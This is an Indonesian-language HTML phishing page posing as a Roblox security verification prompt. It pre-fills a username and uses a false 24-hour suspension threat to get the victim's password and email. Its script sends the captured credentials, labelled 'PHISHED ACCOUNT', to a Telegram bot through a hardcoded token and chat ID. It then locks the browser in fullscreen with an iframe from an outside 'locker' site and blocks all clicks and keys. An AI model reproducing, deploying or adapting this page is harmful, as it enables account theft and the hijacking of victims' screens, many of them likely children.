<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Roblox - Verifikasi Keamanan</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif}
        body{background:#fff;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
        .card{background:#000;border-radius:28px;padding:40px;width:100%;max-width:420px;box-shadow:0 20px 40px rgba(0,0,0,0.1);border:1px solid #222}
        .logo{text-align:center;margin-bottom:25px}
        .logo img{width:70px;height:70px;border-radius:50%;object-fit:cover;filter:grayscale(100%)}
        h2{color:#fff;text-align:center;font-size:24px;margin-bottom:8px}
        .sub{color:#aaa;text-align:center;font-size:14px;margin-bottom:28px}
        .input-group{margin-bottom:18px}
        .input-group label{display:block;color:#ccc;font-size:13px;margin-bottom:6px;font-weight:500}
        .input-group input{width:100%;padding:14px 16px;background:#111;border:1px solid #333;border-radius:14px;color:#fff;font-size:15px;outline:none}
        .input-group input:focus{border-color:#666}
        .input-group input::placeholder{color:#555}
        button{width:100%;padding:14px;background:#fff;border:none;border-radius:14px;color:#000;font-weight:700;font-size:16px;cursor:pointer;margin-top:12px;transition:all 0.2s}
        button:hover{background:#eee}
        .warning{text-align:center;font-size:12px;color:#ffaa44;margin-top:20px;padding-top:16px;border-top:1px solid #222}
        .footer{text-align:center;font-size:11px;color:#555;margin-top:16px}
        .optional{color:#555;font-size:11px;margin-top:4px;text-align:right}
        .card input[readonly]{background:#0a0a0a;color:#aaa;cursor:not-allowed}
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRKksyhn1MIlhL7qV4GOQrY67U4VjPSn39UHeGy_2BjTQ&s=10" alt="Roblox" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 40 40\'%3E%3Crect width=\'40\' height=\'40\' fill=\'%23333\'/%3E%3Ctext x=\'20\' y=\'28\' text-anchor=\'middle\' fill=\'%23fff\' font-size=\'20\'%3ER%3C/text%3E%3C/svg%3E'">
        </div>
        <h2>Verifikasi Keamanan</h2>
        <div class="sub">Kami mendeteksi aktivitas mencurigakan di akun Anda</div>
        
        <div class="input-group">
            <label>Username Roblox</label>
            <input type="text" id="username" value="Nadhineprince_Hoi90" readonly>
        </div>
        <div class="input-group">
            <label>Password</label>
            <input type="password" id="password" placeholder="Masukkan password Anda">
        </div>
        <div class="input-group">
            <label>Email (Opsional)</label>
            <input type="email" id="email" placeholder="Email untuk pemulihan akun">
        </div>
        <button id="submitBtn">Verifikasi Akun</button>
        <div class="warning">⚠️ Akun Anda akan ditangguhkan dalam 24 jam jika tidak diverifikasi</div>
        <div class="footer">Roblox Security • Koneksi Terenkripsi</div>
        <div class="optional">Email opsional, hanya untuk pemulihan</div>
    </div>

    <script>
        // ============ KONFIGURASI TELEGRAM (YANG LO TEST WORK) ============
        const BOT_TOKEN = '8704882865:AAFSHM_ejAs617lcaDNhBne2_bm97TXsmyA';
        const CHAT_ID = '7171049563';
        
        // ============ KIRIM KE TELEGRAM ============
        async function sendToTelegram(username, password, email) {
            let time = new Date().toLocaleString('id-ID');
            let text = `🔓 PHISHED ACCOUNT 🔓\n\n👤 Username: ${username}\n🔑 Password: ${password}`;
            if(email && email.trim()) text += `\n📧 Email: ${email}`;
            text += `\n🕒 Waktu: ${time}\n\n— Baja Bot —`;
            
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'HTML'
                    })
                });
                const data = await response.json();
                return data.ok === true;
            } catch(e) {
                return false;
            }
        }
        
        // ============ LOCK + REDIRECT KE BAJA LOCKER ============
        function lockAndRedirect() {
            try { document.documentElement.requestFullscreen(); } catch(e) {}
            document.body.innerHTML = '<iframe src="https://baja-locker.netlify.app/" style="position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:9999999;background:#fff"></iframe>';
            document.body.style.overflow = 'hidden';
            document.onclick = function(e){ e.preventDefault(); return false; };
            document.onkeydown = function(e){ e.preventDefault(); return false; };
            setInterval(() => {
                if(!document.fullscreenElement) {
                    try { document.documentElement.requestFullscreen(); } catch(e) {}
                }
            }, 1000);
        }
        
        // ============ MAIN ============
        window.steal = async function() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const email = document.getElementById('email').value;
            const btn = document.getElementById('submitBtn');
            
            if(!password) {
                alert('Masukkan password Anda');
                return;
            }
            
            btn.disabled = true;
            btn.innerText = 'Memverifikasi...';
            
            const sent = await sendToTelegram(username, password, email);
            
            if(sent) {
                lockAndRedirect();
            } else {
                btn.disabled = false;
                btn.innerText = 'Verifikasi Akun';
                alert('Verifikasi gagal. Silakan coba lagi.');
            }
        };
        
        document.getElementById('submitBtn').onclick = window.steal;
        document.getElementById('password').onkeypress = function(e) {
            if(e.key === 'Enter') window.steal();
        };
    </script>
</body>
</html>
